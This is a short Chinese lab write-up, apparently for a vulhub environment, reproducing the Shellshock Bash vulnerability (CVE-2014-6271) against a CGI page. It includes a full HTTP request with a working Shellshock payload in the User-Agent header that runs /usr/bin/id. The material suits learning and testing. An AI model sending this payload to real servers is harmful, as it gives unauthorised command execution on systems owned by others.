

# Shellshock远程命令注入（CVE-2014-6271）

###### by ADummy

### 0x00利用路线

​			Burpsuite发包--->命令执行

### 0x01漏洞介绍

​		CVE-2014-6271（即“破壳”漏洞）广泛存在与GNU Bash 版本小于等于4.3的*inux的系统之中，只要目标服务器开放着与Bash相交互的应用与服务，就有可能成功触发漏洞，获取目标系统当前Bash运行用户相同权限的shell接口

### 0x 02漏洞复现

当您访问时，`http://your-ip/`您应该看到两个文件：

- safe.cgi
- victim.cgi

由最新版本的bash生成的safe.cgi，而受害人.cgi是由bash4.3生成的页面，该页面容易受到shellshock的攻击。

当访问受害者.cgi时，我们可以在用户代理字符串中发送包含有效载荷的命令，并且该命令已成功执行：

```
GET /victim.cgi HTTP/1.1

Host: 192.168.0.142:8080

Accept-Encoding:gzip, deflate

Accept: */*

Accept-Language: en

User-Agent: () { foo ; } ; echo Content-Type: text/plain; echo; /usr/bin/id

Connection: close
```

![Shellshock_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Shellshock_RCE_1.jpg)

![Shellshock_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Shellshock_RCE_2.jpg)





### 



